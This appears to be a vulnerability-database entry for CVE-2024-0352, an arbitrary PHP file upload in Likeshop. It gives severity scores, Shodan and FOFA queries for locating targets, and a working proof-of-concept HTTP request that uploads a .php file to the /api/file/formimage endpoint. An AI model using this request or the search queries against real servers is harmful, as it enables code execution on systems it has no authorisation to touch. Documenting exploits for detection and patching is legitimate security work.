---
layout: post
cve_id: CVE-2024-0352
title: Likeshop < 2.5.7.20210311 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2024/CVE-2024-0352.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-0352.yaml
snort2_rule: N/A
snort3_rule: N/A
author: CookieHanHoan,babybash,samuelsamuelsamuel
severity: critical
impact: 'The product allows the attacker to upload or transfer files of dangerous
  types that can be automatically processed within the product''s environment. As
  an impact it is known to affect confidentiality, integrity, and availability.

  '
remediation: Update to the latest version
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2024-0352
- https://note.zhaoj.in/share/ciwYj7QXC4sZ
- https://vuldb.com/?ctiid.250120
- https://vuldb.com/?id.250120
- https://github.com/tanjiti/sec_profile
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-0352
  cwe-id: CWE-434
  epss-score: 0.92157
  epss-percentile: 0.99693
  cpe: cpe:2.3:a:likeshop:likeshop:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: likeshop
  product: likeshop
  shodan-query: http.favicon.hash:874152924
  fofa-query: icon_hash=874152924
tags:
- cve
- cve2024
- rce
- file-upload
- likeshop
- instrusive
- intrusive
- vkev
- vuln
---

## ðŸ” Vulnerability Description
A vulnerability classified as critical was found in Likeshop up to 2.5.7.20210311. This vulnerability affects the function FileServer::userFormImage of the file server/application/api/controller/File.php of the component HTTP POST Request Handler. The manipulation of the argument file with an unknown input leads to a unrestricted upload vulnerability. The CWE definition for the vulnerability is CWE-434


## ðŸŒ HTTP Request
```nohighlight
POST /api/file/formimage HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Connection: close
Content-Length: 203
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Accept-Encoding: gzip

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file";filename="JIAuTDXl.php"
Content-Type: application/x-php

38BHvPoWNBeEDHueqFEnPx2cEhk
------WebKitFormBoundarygcflwtei--
```

